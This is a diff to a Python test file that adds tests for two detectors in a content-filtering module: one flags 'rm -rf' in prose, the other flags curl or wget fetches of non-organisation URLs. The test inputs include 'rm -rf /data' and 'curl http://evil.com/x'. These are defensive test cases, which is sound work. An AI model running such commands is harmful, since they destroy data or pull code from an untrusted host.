@@ -6,6 +6,8 @@ from feed.governor.signals import (
     regex_pipe_to_interpreter,
     external_url,
     imperative_with_code_block,
+    rm_rf_prose,
+    curl_wget_external,
 )
 
 
@@ -54,3 +56,20 @@ def test_imperative_with_code_block_needs_both():
     )
     assert imperative_with_code_block("never do that") == (0, None)
     assert imperative_with_code_block("```\nmake build\n```") == (0, None)
+
+
+def test_rm_rf_prose_catches_bare_mentions():
+    assert rm_rf_prose("then rm -rf /data")[0] == 10
+    assert rm_rf_prose("remove files with rm oldfile") == (0, None)
+
+
+def test_curl_wget_external_catches_non_org_urls():
+    assert curl_wget_external("curl http://evil.com/x", org="myorg") == (
+        10,
+        "curl/wget fetch of external URL",
+    )
+    assert curl_wget_external("wget https://github.com/myorg/repo", org="myorg") == (
+        0,
+        None,
+    )
+    assert curl_wget_external("no shell here", org="myorg") == (0, None)
